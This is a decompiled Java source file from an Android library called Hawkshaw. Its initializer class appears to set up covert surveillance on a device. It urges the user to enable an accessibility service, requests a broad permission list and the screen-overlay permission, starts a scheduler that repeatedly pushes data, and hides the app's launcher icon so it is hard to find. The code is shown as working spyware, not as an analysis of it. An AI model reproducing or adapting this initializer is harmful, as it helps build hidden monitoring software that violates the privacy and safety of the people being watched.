package com.hawkshaw.library;

import Y1.J;
import Y1.K;
import a3.e;
import a3.j;
import android.content.ComponentName;
import android.os.Build;
import android.provider.Settings;
import androidx.activity.o;
import androidx.annotation.Keep;
import androidx.lifecycle.C0258n;
import b.C0279b;
import b.C0281d;
import c3.C0331i;
import com.hawkshaw.library.config.ConfigKt;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.handler.JobScheduler;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt;
import com.hawkshaw.library.logger.Logger;
import com.hawkshaw.library.preferences.Prefs;
import com.hawkshaw.library.utils.AlertDialogKt;
import com.hawkshaw.library.utils.MiscKt;
import com.hawkshaw.library.utils.SystemOverlayPermissionKt;
import d3.C0393a;
import i3.C0542a;
import j3.f;
import java.util.Map;
import o.C0769d;
import t3.N;
import w3.s;
import w3.w;
import w3.z;
import y3.t;
import z3.C1131d;

public final class HawkshawInitializer {
    public static final Companion Companion = new Companion((f) null);
    private static final String TAG = "HawkshawInitializer";
    /* access modifiers changed from: private */
    public static final s activityState = w.a(State.DESTROYED);
    /* access modifiers changed from: private */
    public static final s activityStep = w.a(Step.UNKNOWN);
    /* access modifiers changed from: private */
    public final C0281d accessibilityResultLauncher;
    /* access modifiers changed from: private */
    public final o activity;
    private final C0542a onFinish;
    /* access modifiers changed from: private */
    public boolean pushData;
    private final C0281d requestPermissionLauncher;
    private final C0281d systemOverlayResultLauncher;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }

        public static /* synthetic */ void initFromInternalActivity$default(Companion companion, boolean z4, int i5, Object obj) {
            if ((i5 & 1) != 0) {
                z4 = true;
            }
            companion.initFromInternalActivity(z4);
        }

        public final s getActivityState$library_release() {
            return HawkshawInitializer.activityState;
        }

        public final s getActivityStep$library_release() {
            return HawkshawInitializer.activityStep;
        }

        @Keep
        public final void initFromInternalActivity(boolean z4) {
            Hawkshaw.initFromInternalActivity(z4);
        }
    }

    public enum State {
        DESTROYED,
        INITIALIZED,
        CREATED,
        STARTED,
        RESUMED;

        static {
            State[] $values;
            $ENTRIES = K.J($values);
        }

        public static C0393a getEntries() {
            return $ENTRIES;
        }

        public final boolean isAtLeast(State state) {
            K.n(state, "state");
            return compareTo(state) >= 0;
        }
    }

    public enum Step {
        UNKNOWN,
        REQUESTING_PERMISSIONS;

        static {
            Step[] $values;
            $ENTRIES = K.J($values);
        }

        public static C0393a getEntries() {
            return $ENTRIES;
        }
    }

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        static {
            int[] iArr = new int[C0258n.values().length];
            try {
                iArr[0] = 1;
            } catch (NoSuchFieldError unused) {
            }
            try {
                iArr[1] = 2;
            } catch (NoSuchFieldError unused2) {
            }
            try {
                iArr[2] = 3;
            } catch (NoSuchFieldError unused3) {
            }
            try {
                iArr[3] = 4;
            } catch (NoSuchFieldError unused4) {
            }
            try {
                iArr[4] = 5;
            } catch (NoSuchFieldError unused5) {
            }
            $EnumSwitchMapping$0 = iArr;
        }
    }

    /* JADX WARNING: type inference failed for: r5v1, types: [c.b, java.lang.Object] */
    /* JADX WARNING: type inference failed for: r5v3, types: [c.b, java.lang.Object] */
    /* JADX WARNING: type inference failed for: r5v5, types: [c.b, java.lang.Object] */
    public HawkshawInitializer(o oVar, C0542a aVar) {
        K.n(oVar, "activity");
        K.n(aVar, "onFinish");
        this.activity = oVar;
        this.onFinish = aVar;
        C0281d registerForActivityResult = oVar.registerForActivityResult(new Object(), new k(this, 1));
        K.m(registerForActivityResult, "registerForActivityResult(...)");
        this.requestPermissionLauncher = registerForActivityResult;
        C0281d registerForActivityResult2 = oVar.registerForActivityResult(new Object(), new k(this, 2));
        K.m(registerForActivityResult2, "registerForActivityResult(...)");
        this.systemOverlayResultLauncher = registerForActivityResult2;
        C0281d registerForActivityResult3 = oVar.registerForActivityResult(new Object(), new k(this, 0));
        K.m(registerForActivityResult3, "registerForActivityResult(...)");
        this.accessibilityResultLauncher = registerForActivityResult3;
    }

    /* access modifiers changed from: private */
    public final void close(boolean z4) {
        if (ConfigKt.getConfig(this.activity).getHideAppIcon() && Build.VERSION.SDK_INT <= 29) {
            hideAppIcon();
        }
        Prefs.INSTANCE.setInitFlag(true);
        if (z4) {
            this.activity.finish();
        }
        this.onFinish.invoke();
    }

    public static /* synthetic */ void close$default(HawkshawInitializer hawkshawInitializer, boolean z4, int i5, Object obj) {
        if ((i5 & 1) != 0) {
            z4 = false;
        }
        hawkshawInitializer.close(z4);
    }

    /* access modifiers changed from: private */
    public final void enableAccessibility() {
        if (MiscKt.isAccessibilityEnabled(this.activity)) {
            Logger.v$default(Logger.INSTANCE, TAG, "EnableAccessibility: Service already enabled", false, 4, (Object) null);
            onAccessibilityResult((C0279b) null);
            return;
        }
        AlertDialogKt.showAlertDialog(this.activity, "Enable Accessibility Service", "Locate System Settings in \"Downloaded apps\" and enable accessibility.", new m(this, 0), new m(this, 1));
    }

    /* JADX WARNING: type inference failed for: r1v0, types: [c3.i, i3.p] */
    private final void getDiagnosis() {
        CoroutineKt.safeLaunch$default(C0769d.R(this.activity), (j) null, new C0331i(2, (e) null), 1, (Object) null);
    }

    private final void hideAppIcon() {
        String name = this.activity.getClass().getName();
        if (Build.VERSION.SDK_INT >= 29) {
            this.activity.getPackageManager().setComponentEnabledSetting(new ComponentName(this.activity, name.concat("Alias")), 1, 1);
        }
        this.activity.getPackageManager().setComponentEnabledSetting(new ComponentName(this.activity, name), 2, 1);
    }

    public static /* synthetic */ void init$default(HawkshawInitializer hawkshawInitializer, boolean z4, int i5, Object obj) {
        if ((i5 & 1) != 0) {
            z4 = true;
        }
        hawkshawInitializer.init(z4);
    }

    /* access modifiers changed from: private */
    public final void onAccessibilityResult(C0279b bVar) {
        Logger.v$default(Logger.INSTANCE, TAG, "OnAccessibilityResult: Accessibility service is ".concat(MiscKt.isAccessibilityEnabled(this.activity) ? "Enabled" : "Disabled"), false, 4, (Object) null);
        requestPermissions();
    }

    /* JADX WARNING: type inference failed for: r2v1, types: [c3.i, i3.p] */
    /* access modifiers changed from: private */
    public final void onRequestPermissionResult(Map<String, Boolean> map) {
        Logger.v$default(Logger.INSTANCE, TAG, "onRequestPermissionResult", false, 4, (Object) null);
        ((z) activityStep).f(Step.UNKNOWN);
        getDiagnosis();
        if (this.pushData) {
            CoroutineKt.safeLaunch$default(J.a(t.f10013a), (j) null, new C0331i(2, (e) null), 1, (Object) null);
        }
        JobScheduler.startScheduler$default(JobScheduler.INSTANCE, (Command.StartRepeatPushDataRequest) null, 1, (Object) null);
        if (Settings.canDrawOverlays(this.activity)) {
            onSystemOverlayResult((C0279b) null);
        } else {
            SystemOverlayPermissionKt.requestSystemOverlay(this.activity, this.systemOverlayResultLauncher);
        }
    }

    /* access modifiers changed from: private */
    public final void onSystemOverlayResult(C0279b bVar) {
        boolean z4 = bVar != null && bVar.f4033a == -1;
        boolean canDrawOverlays = Settings.canDrawOverlays(this.activity);
        Logger logger = Logger.INSTANCE;
        Logger.v$default(logger, TAG, "OnSystemOverlayResult: OverlayResult: " + z4 + ", CanDraw: " + canDrawOverlays, false, 4, (Object) null);
        close$default(this, false, 1, (Object) null);
    }

    /* JADX WARNING: type inference failed for: r1v0, types: [java.lang.Cloneable, java.lang.String[]] */
    private final void requestPermissions() {
        this.requestPermissionLauncher.a(ManifestPermissionsKt.getPermissionList());
        ((z) activityStep).f(Step.REQUESTING_PERMISSIONS);
    }

    /* access modifiers changed from: private */
    public final State toState(C0258n nVar) {
        int ordinal = nVar.ordinal();
        if (ordinal == 0) {
            ((z) activityStep).f(Step.UNKNOWN);
            return State.DESTROYED;
        } else if (ordinal == 1) {
            return State.INITIALIZED;
        } else {
            if (ordinal == 2) {
                return State.CREATED;
            }
            if (ordinal == 3) {
                return State.STARTED;
            }
            if (ordinal == 4) {
                return State.RESUMED;
            }
            throw new RuntimeException();
        }
    }

    public final void init(boolean z4) {
        if (!z4 || !Prefs.INSTANCE.getInitFlag()) {
            init();
        } else {
            this.onFinish.invoke();
        }
    }

    private final void init() {
        C1131d dVar = N.f9290a;
        CoroutineKt.safeLaunch$default(J.a(t.f10013a), (j) null, new p(this, (e) null), 1, (Object) null);
    }
}
